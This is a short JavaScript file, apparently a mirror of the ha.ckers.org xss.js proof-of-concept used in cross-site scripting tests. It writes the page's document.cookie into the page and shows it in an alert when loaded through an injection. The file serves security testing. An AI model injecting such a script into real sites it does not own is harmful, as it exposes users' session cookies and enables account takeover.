/* This file is based on the file from http://ha.ckers.org/xss.js
   It has been reproduced here due to the extended downtime of ha.ckers.org
   This file is being hosted as a courtesy to the security community.
*/

document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);

